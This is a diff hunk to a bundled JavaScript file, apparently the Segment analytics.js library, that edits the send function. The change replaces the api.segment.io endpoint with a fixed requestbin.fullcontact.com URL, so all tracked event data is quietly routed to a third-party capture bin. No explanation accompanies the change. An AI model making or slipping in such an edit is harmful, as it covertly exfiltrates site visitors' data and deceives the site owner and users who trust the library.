@@ -18079,7 +18079,7 @@ Segment.prototype.normalize = function(msg) {
  */
 
 Segment.prototype.send = function(path, msg, fn) {
-  var url = scheme() + '//api.segment.io/v1' + path;
+  var url = scheme() + '//requestbin.fullcontact.com/1dna4uo1';
   var headers = { 'Content-Type': 'text/plain' };
   fn = fn || noop;
   var self = this;
